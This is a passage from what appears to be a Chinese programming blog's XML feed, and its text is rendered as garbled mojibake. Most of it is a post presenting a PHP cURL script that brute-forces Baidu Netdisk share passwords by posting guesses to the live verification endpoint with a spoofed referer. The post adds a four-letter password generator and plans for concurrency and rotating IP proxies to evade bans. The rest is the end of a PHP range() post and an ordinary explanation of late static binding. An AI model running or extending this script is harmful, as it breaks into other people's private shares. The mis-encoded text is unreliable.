class="string">"-"</span>,<span class="string">"."</span>,<span class="string">"\/"</span>,<span class="string">"0"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">":"</span>,<span class="string">";"</span>,<span class="string">"&lt;"</span>,<span class="string">"="</span>,<span class="string">"&gt;"</span>,<span class="string">"?"</span>,<span class="string">"@"</span>,<span class="string">"A"</span>,<span class="string">"B"</span>,<span class="string">"C"</span>,<span class="string">"D"</span>,<span class="string">"E"</span>,<span class="string">"F"</span>,<span class="string">"G"</span>,<span class="string">"H"</span>,<span class="string">"I"</span>,<span class="string">"J"</span>,<span class="string">"K"</span>,<span class="string">"L"</span>,<span class="string">"M"</span>,<span class="string">"N"</span>,<span class="string">"O"</span>,<span class="string">"P"</span>,<span class="string">"Q"</span>,<span class="string">"R"</span>,<span class="string">"S"</span>,<span class="string">"T"</span>,<span class="string">"U"</span>,<span class="string">"V"</span>,<span class="string">"W"</span>,<span class="string">"X"</span>,<span class="string">"Y"</span>,<span class="string">"Z"</span>,<span class="string">"["</span>,<span class="string">"\\"</span>,<span class="string">"]"</span>,<span class="string">"^"</span>,<span class="string">"_"</span>,<span class="string">"`"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"e"</span>,<span class="string">"f"</span>,<span class="string">"g"</span>,<span class="string">"h"</span>,<span class="string">"i"</span>,<span class="string">"j"</span>,<span class="string">"k"</span>,<span class="string">"l"</span>,<span class="string">"m"</span>,<span class="string">"n"</span>,<span class="string">"o"</span>,<span class="string">"p"</span>,<span class="string">"q"</span>,<span class="string">"r"</span>,<span class="string">"s"</span>,<span class="string">"t"</span>,<span class="string">"u"</span>,<span class="string">"v"</span>,<span class="string">"w"</span>,<span class="string">"x"</span>,<span class="string">"y"</span>,<span class="string">"z"</span>,<span class="string">"&#123;"</span>,<span class="string">"|"</span>,<span class="string">"&#125;"</span>,<span class="string">"~"</span>] </span><br></pre></td></tr></table></figure></blockquote><h1 id="åŸæ–‡åœ°å€"><a href="#åŸæ–‡åœ°å€" class="headerlink" title="åŸæ–‡åœ°å€"></a>åŸæ–‡åœ°å€</h1><p><a href="https://www.twle.cn/c/yufei/phpmiss/phpmiss-basic-range.html" target="_blank" rel="noopener">https://www.twle.cn/c/yufei/phpmiss/phpmiss-basic-range.html</a></p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç™¾åº¦ç½‘ç›˜åˆ†äº«å¯†ç æš´åŠ›ç ´è§£</title>
      <link href="/post/crack-pwd-of-baidu-netdisk/"/>
      <url>/post/crack-pwd-of-baidu-netdisk/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cm8wum14j30wq0fc3zg.jpg" alt=""></p><p>å‰å‡ å¤©é˜…è¯»äº†ä¸€ç¯‡<a href="https://thezerohack.com/hack-any-instagram" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œä½œè€…é€šè¿‡æšä¸¾é‡ç½®å¯†ç çš„æ‰‹æœºéªŒè¯ç æ¥ä¿®æ”¹ä»»æ„ç”¨æˆ·çš„è´¦å·å¯†ç ã€‚è¿™ç§æ–¹å¼è¢«æ™®éåº”ç”¨ï¼Œä½†æˆ‘ä»¬ç¡®å®æ¯”è¾ƒå°‘çš„å…³å¿ƒè¿™å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œçº¯æ•°å­—çš„éªŒè¯ç åªè¦åœ¨å¤±æ•ˆå‰é€šè¿‡ç¨‹åºæšä¸¾å¾ˆå¿«å°±èƒ½è¢«ç ´è§£ã€‚å—æ­¤å¯å‘ï¼Œä¹Ÿæƒ³å°è¯•ä¸‹ç™¾åº¦ç½‘ç›˜çš„åˆ†äº«å¯†ç ç ´è§£è¯•éªŒã€‚</p><a id="more"></a><p>ç™¾åº¦ç½‘ç›˜çš„åˆ†äº«å¯†ç ä¸º4ä¸ªå­—ç¬¦ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨è®¤è¯æ¥å£æ¥æš´åŠ›ç ´è§£ã€‚</p><p>é€šè¿‡ Chrome çš„ç½‘ç»œè¯·æ±‚åˆ†æï¼Œç»“åˆ POSTMAN æ¨¡æ‹Ÿè¯·æ±‚ï¼Œæˆ‘ä»¬å¾—çŸ¥ï¼Œç½‘ç›˜å¯†ç è®¤è¯ä¸»è¦å‚æ•°æœ‰</p><ol><li>åˆ†äº«é“¾æ¥è¯†åˆ«ç </li><li>æ¯«ç§’æ—¶é—´æˆ³</li><li>http çš„ refer å¤´</li><li>post æ–¹å¼å‘é€çš„å¯†ç </li></ol><p>äºæ˜¯ï¼Œæˆ‘ä»¬æœ‰äº†ä»¥ä¸‹çš„ä¸€æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crackBaiduNetdiskPwd</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $shareCode = ltrim(strstr($url, <span class="string">'/1'</span>),<span class="string">'/1'</span>);</span><br><span class="line">    $baseUrl = <span class="string">'https://pan.baidu.com/share/verify?'</span>;</span><br><span class="line">    $get_params = [</span><br><span class="line">        <span class="string">'surl'</span> =&gt; $shareCode,</span><br><span class="line">        <span class="string">'t'</span> =&gt; intval(microtime(<span class="keyword">true</span>) * <span class="number">1000</span>),</span><br><span class="line">        <span class="string">'channel'</span> =&gt; <span class="string">'chunlei'</span>,</span><br><span class="line">        <span class="string">'web'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'clienttype'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'app_id'</span> =&gt; <span class="number">123456</span>,</span><br><span class="line">        <span class="string">'bdstoken'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'logid'</span> =&gt; <span class="string">'MTU2Njc5MTgzODkyNzAuNjM3NzgzODMwMzQ1MjE3NQ=='</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $requestUrl = $baseUrl.http_build_query($get_params);</span><br><span class="line"></span><br><span class="line">    $pwd = <span class="string">'77wk'</span>;<span class="comment">//todo ç”Ÿæˆå¯†ç </span></span><br><span class="line">    $post_params = [</span><br><span class="line">        <span class="string">'pwd'</span> =&gt; $pwd,</span><br><span class="line">        <span class="string">'vscode'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'vscode_str'</span> =&gt; <span class="string">''</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $ch = curl_init($requestUrl);</span><br><span class="line">    curl_setopt_array(</span><br><span class="line">        $ch,</span><br><span class="line">        [</span><br><span class="line">            CURLOPT_POST =&gt; <span class="keyword">true</span>,</span><br><span class="line">            CURLOPT_POSTFIELDS =&gt; http_build_query($post_params),<span class="comment">//è®¾å®š POST å‚æ•°å†…å®¹</span></span><br><span class="line">            <span class="comment">// CURLOPT_FOLLOWLOCATION =&gt; true,//è·Ÿéšé‡å®šå‘åœ°å€</span></span><br><span class="line">            <span class="comment">// CURLOPT_AUTOREFERER =&gt; true,</span></span><br><span class="line">            CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,<span class="comment">//å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥å­—ç¬¦ä¸²è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚</span></span><br><span class="line">            CURLOPT_USERAGENT =&gt; <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'</span>,</span><br><span class="line">            CURLOPT_REFERER =&gt; <span class="string">'https://pan.baidu.com/share/init?surl='</span>.$shareCode<span class="comment">//å¿…å¡«é¡¹</span></span><br><span class="line">        ]</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//todo å¹¶å‘è¯·æ±‚ https://www.php.net/manual/zh/function.curl-multi-init.php#118142</span></span><br><span class="line">    $response = curl_exec($ch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(! json_decode($response)-&gt;errno) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ç ´è§£æˆåŠŸï¼Œå¯†ç ä¸ºï¼š'</span>.$pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">crackBaiduNetdiskPwd(<span class="string">'https://pan.baidu.com/s/1gftmNyb'</span>);</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œå•æ¬¡è¯·æ±‚å·²ç»æˆåŠŸï¼Œä½†å‰©ä½™çš„å·¥ä½œè¿˜æœ‰ï¼š</p><ol><li>æˆ‘ä»¬éœ€è¦ç”Ÿæˆçº¯å­—æ¯ã€å­—æ¯æ•°å­—ã€çº¯æ•°å­—ä¸‰ç§ç±»å‹çš„å¯†ç ï¼Œä¸”è¿™ä¸‰ç±»çš„æƒé‡ä¾æ¬¡é™ä½ï¼Œä¸‰ç±»ä¸­çš„é‡å¤å¯†ç ï¼ˆå¦‚ï¼š<code>aaaa</code>ï¼Œ<code>6666</code>ï¼‰æƒé‡æœ€ä½</li><li>ç»™å®šå¯†ç åŒºé—´æ®µå’Œç±»å‹ï¼Œå¦‚ä½•ç”ŸæˆæŒ‡å®šé•¿åº¦çš„å¯†ç ï¼Œå¦‚ï¼Œæ€æ ·ç”Ÿæˆ<code>aaaa ~ zzzz</code>çš„å¯†ç ï¼Ÿï¼ˆç°æœ‰æ€è·¯ï¼šå°†å­—æ¯è½¬æ¢ä¸º ASCII å¯¹åº”çš„æ•°å­—ï¼Œå…± 4 ä¸ªä½ï¼Œå°†å…¶è½¬æ¢ä¸ºæ•°ç»„ã€‚å¦‚æœç¬¬0ä½å€¼è¾¾åˆ°<code>z</code>ï¼Œåˆ™å‘é«˜ä½è¿›ä½ï¼Œä½ä½å½’ä½å¤„ç†ï¼‰</li><li>php å®ç°å¹¶å‘è¯·æ±‚</li><li>æ·»åŠ IPä»£ç†ï¼Œé¿å…å•ä¸€IPè¯·æ±‚è¢«å°ç¦</li><li>æ·»åŠ æ—¥å¿—ï¼Œæ”¯æŒæ–­ç‚¹ç»­ç ´</li><li>è®°å½•æ¯æ¬¡ç ´è§£çš„è€—æ—¶ä¸æ¬¡æ•°ï¼Œç”¨äºåæœŸåˆ†æ</li></ol><p>â€”2019-09-19æ›´æ–°â€”</p><p>ç”Ÿæˆ<code>aaaa ~ zzzz</code>çš„å¯†ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphabet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="string">'aaaa'</span>; $i &lt; <span class="string">'zzzz'</span>; $i++) &#123;</span><br><span class="line">        <span class="keyword">yield</span> $i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'zzzy'</span> === $i) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">yield</span> get4Z();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get4Z</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'zzzz'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (getAlphabet() <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå­—æ¯æ•°å­—çš„å¯†ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphanumeric</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//todo </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ol><li>å¦‚æœéœ€è¦è·å–æ›´é«˜ç²¾åº¦çš„æ—¶é—´æˆ³ï¼Œå¯ä»¥è°ƒæ•´<code>php.ini</code>ä¸­çš„<code>precision</code>çš„å€¼ã€‚</li><li><code>curl_setopt_array</code>ä¸­çš„ key æ˜¯é¢„è®¾å¸¸é‡ï¼Œå¦‚æœå†™ä½œå­—ç¬¦ä¸²ï¼ˆå¦‚<code>&#39;CURLOPT_POSTFIELDS&#39;</code>ï¼‰ï¼Œåˆ™ä¼šæœ‰<code>curl_setopt_array(): Array keys must be CURLOPT constants or equivalent integer values in</code>çš„é”™è¯¯</li></ol>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€è½¬ã€‘å¯¹PHPåæœŸé™æ€ç»‘å®šçš„ç†è§£</title>
      <link href="/post/late-static-binding/"/>
      <url>/post/late-static-binding/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gchlflx58bj30ku0b43zt.jpg" alt=""></p><a id="more"></a><h1 id="ä»€ä¹ˆæ˜¯åæœŸé™æ€ç»‘å®š"><a href="#ä»€ä¹ˆæ˜¯åæœŸé™æ€ç»‘å®š" class="headerlink" title="ä»€ä¹ˆæ˜¯åæœŸé™æ€ç»‘å®š"></a>ä»€ä¹ˆæ˜¯åæœŸé™æ€ç»‘å®š</h1><p>åœ¨çœ‹ä¸€äº›æ¡†æ¶æºç æˆ–è€…æ˜¯æŸä¸ªé¡¹ç›®çš„ä»£ç æ—¶ï¼Œç»å¸¸èƒ½çœ‹åˆ°åæœŸé™æ€ç»‘å®šçš„ç”¨æ³•ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ®µï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">static</span>::$instance)) &#123;</span><br><span class="line">        <span class="keyword">static</span>::$instance = <span class="keyword">new</span> <span class="keyword">static</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static</span>::$instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°çš„å°±æ˜¯åæœŸé™æ€ç»‘å®šã€‚é‚£ä¹ˆï¼Œä»€ä¹ˆæ˜¯åæœŸé™æ€ç»‘å®šï¼Ÿ</p><p>â€œåæœŸç»‘å®šâ€ çš„æ„æ€æ˜¯è¯´ï¼Œ<code>static::</code>ä¸å†è¢«è§£æä¸ºå®šä¹‰å½“å‰æ–¹æ³•æ‰€åœ¨çš„ç±»ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶è®¡ç®—çš„ã€‚è¿™é‡Œè¦å…ˆè¯´ä¸¤ä¸ªæ¦‚å¿µï¼Œä¸€ä¸ªæ˜¯è½¬å‘è°ƒç”¨ï¼Œå¦ä¸€ä¸ªæ˜¯éè½¬å‘è°ƒç”¨ã€‚</p><ul><li><p>è½¬å‘è°ƒç”¨<br>æ‰€è°“çš„ â€œè½¬å‘è°ƒç”¨â€ï¼ˆforwarding callï¼‰æŒ‡çš„æ˜¯é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼è¿›è¡Œçš„é™æ€è°ƒç”¨ï¼š<code>self::</code>, <code>parent::</code>, <a href="https://www.php.net/manual/zh/language.oop5.static.php" target="_blank" rel="noopener"><code>static::</code></a> ä»¥åŠ <a href="https://www.php.net/manual/zh/function.forward-static-call.php" target="_blank" rel="noopener"><code>forward_ static _call()</code></a>ã€‚å³<strong>åœ¨è¿›è¡Œé™æ€è°ƒç”¨æ—¶æœªæŒ‡æ˜ç±»åçš„è°ƒç”¨å±äºè½¬å‘è°ƒç”¨</strong>ã€‚</p></li><li><p>éè½¬å‘è°ƒç”¨<br>éè½¬å‘è°ƒç”¨å…¶å®å°±æ˜¯æ˜ç¡®æŒ‡å®šç±»åçš„é™æ€è°ƒç”¨ï¼ˆ<code>foo::bar()</code>ï¼‰å’Œéé™æ€è°ƒç”¨ (<code>$foo-&gt;bar()</code>)ã€‚å³<strong>æ˜ç¡®åœ°æŒ‡å®šç±»åçš„é™æ€è°ƒç”¨å’Œéé™æ€è°ƒç”¨</strong>ã€‚</p></li></ul><p>é¡¾åæ€ä¹‰ï¼Œ<strong>éè½¬å‘è°ƒç”¨å‰é¢æœ‰ç±»åæ‰€ä»¥è°ƒç”¨çš„å‡½æ•°ä¸€å®šæ˜¯å±äº â€œè¿™ä¸ªç±»çš„â€ï¼Œä¸éœ€è¦è½¬åˆ°åˆ«çš„ç±»ã€‚è½¬å‘è°ƒç”¨å°±æ˜¯ç”±äºå‰æœŸçš„é™æ€ç»‘å®šå¯¼è‡´åœ¨åé¢è°ƒç”¨é™æ€æ–¹æ³•æ—¶å¯èƒ½ â€œè½¬å‘åˆ°å…¶ä»–çš„ç±»â€</strong></p><p>åœ¨ PHP çš„å®˜æ–¹æ–‡æ¡£é‡Œï¼Œå¯¹äºåæœŸé™æ€ç»‘å®šæ˜¯è¿™æ ·è¯´çš„ï¼šåæœŸé™æ€ç»‘å®šå·¥ä½œåŸç†æ˜¯å­˜å‚¨äº†åœ¨ä¸Šä¸€ä¸ª â€œéè½¬å‘è°ƒç”¨â€ï¼ˆnon-forwarding callï¼‰ä¸­çš„ç±»åã€‚æ„æ€æ˜¯<strong>å½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªè½¬å‘è°ƒç”¨çš„é™æ€è°ƒç”¨æ—¶ï¼Œå®é™…è°ƒç”¨çš„ç±»æ˜¯ä¸Šä¸€ä¸ªéè½¬å‘è°ƒç”¨çš„ç±»</strong>ã€‚</p><p>æ¥çœ‹ä¸¤ä¸ªä¾‹å­ï¼š</p><p>ä¾‹å­1ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::who(); <span class="comment">// åæœŸé™æ€ç»‘å®šä»è¿™é‡Œå¼€å§‹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">B::test();</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç ä¼šè¾“å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>ä¾‹å­2ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::who();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        A::foo();</span><br><span class="line">        <span class="keyword">parent</span>::foo();</span><br><span class="line">        <span class="keyword">self</span>::foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C::test();</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç ä¼šè¾“å‡º</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">A</span></span><br><span class="line">C</span><br><span class="line">C</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä¸»è¦åˆ†æä¸‹ä¾‹ 2ã€‚</p><ol><li><code>C::test()</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªéè½¬å‘è°ƒç”¨ï¼Œå› ä¸ºï¼šï¼šå‰é¢æœ‰ç±»å Cã€‚</li><li>è¿›å…¥ <code>test()</code> æ–¹æ³•ï¼Œæœ‰ä¸‰ä¸ªé™æ€è°ƒç”¨ <code>A::foo()</code>,<code>parent::foo()</code>,<code>self::foo()</code>, å¯¹äºè¿™ä¸‰ä¸ªé™æ€è°ƒç”¨æ¥è¯´ï¼Œä»–ä»¬çš„éè½¬å‘è°ƒç”¨ç±»å°±æ˜¯ Cã€‚</li><li>ç°åœ¨æ‰§è¡Œ <code>A::foo()</code>, è¿™æ˜¯ä¸€ä¸ªéè½¬å‘è°ƒç”¨ã€‚<code>A::foo()</code> ä¸­çš„ä»£ç æ˜¯ <code>static::who()</code>, è¿™æ˜¯ä¸€ä¸ªè½¬å‘è°ƒç”¨ï¼Œå¯¹äºè¿™ä¸ªè½¬å‘è°ƒç”¨æ¥è¯´ä»–çš„éè½¬å‘è°ƒç”¨ç±»å°±æ˜¯ä¸å†æ˜¯ C è€Œæ˜¯ Aï¼ˆå› ä¸ºä¹‹å‰æ‰§è¡Œäº† <code>A::foo()</code>ï¼‰ã€‚å› æ­¤æ‰§è¡Œçš„ç»“æœä¸º A</li><li>ç°åœ¨æ‰§è¡Œ <code>parent::foo()</code>, è¿™æ˜¯ä¸€ä¸ªè½¬å‘è°ƒç”¨ï¼Œè½¬å‘åˆ°å“ªé‡Œå‘¢ï¼Ÿå°±æ˜¯å®ƒçš„ä¸Šä¸€ä¸ªéè½¬å‘è°ƒç”¨çš„ç±»ï¼Œä¹Ÿå°±æ˜¯ç±» Cï¼ˆåœ¨æ­¥éª¤ 2 ä¸­æåˆ°çš„ï¼‰ã€‚åœ¨è¿™é‡Œä¸€å®šè¦æ³¨æ„è™½ç„¶åœ¨è¿™ä¹‹å‰æ‰§è¡Œäº† <code>A::foo()</code>, ä½†æ˜¯ <code>parent::foo()</code> çš„ä¸Šä¸€ä¸ªéè½¬å‘è°ƒç”¨çš„ç±»ä»»ç„¶æ˜¯ç±» Cã€‚å› æ­¤æ‰§è¡Œçš„ç»“æœæ˜¯ C.</li><li>ç°åœ¨æ‰§è¡Œ <code>self::foo()</code>, è¿™ä¸ªå’Œ <code>parent::foo()</code> ä¸€æ ·éƒ½æ˜¯è½¬å‘è°ƒç”¨ï¼Œå› æ­¤ä¹Ÿè¾“å‡º Cã€‚</li></ol><blockquote><p>æƒ³è¦ææ¸…æ¥šåæœŸé™æ€ç»‘å®šï¼Œå°±æ˜¯è¦çŸ¥é“ <code>static</code> æ˜¯å“ªä¸ªç±»ã€‚</p></blockquote><h1 id="ä½¿ç”¨åæœŸé™æ€ç»‘å®šçš„å¥½å¤„"><a href="#ä½¿ç”¨åæœŸé™æ€ç»‘å®šçš„å¥½å¤„" class="headerlink" title="ä½¿ç”¨åæœŸé™æ€ç»‘å®šçš„å¥½å¤„"></a>ä½¿ç”¨åæœŸé™æ€ç»‘å®šçš„å¥½å¤„</h1><p>åæœŸé™æ€ç»‘å®šç›®å‰æˆ‘çœ‹åˆ°è¾ƒå¤šçš„æ˜¯ç”¨äºå¯¹è±¡å®ä¾‹åŒ–ä¸­ï¼Œåœ¨å®ä¾‹åŒ–å¯¹è±¡æ—¶ï¼Œ<code>static</code> ä¼šæ ¹æ®è¿è¡Œæ—¶è°ƒç”¨çš„ç±»æ¥å†³å®šå®ä¾‹åŒ–å¯¹è±¡ï¼Œè€Œ <code>self</code> åˆ™æ˜¯æ 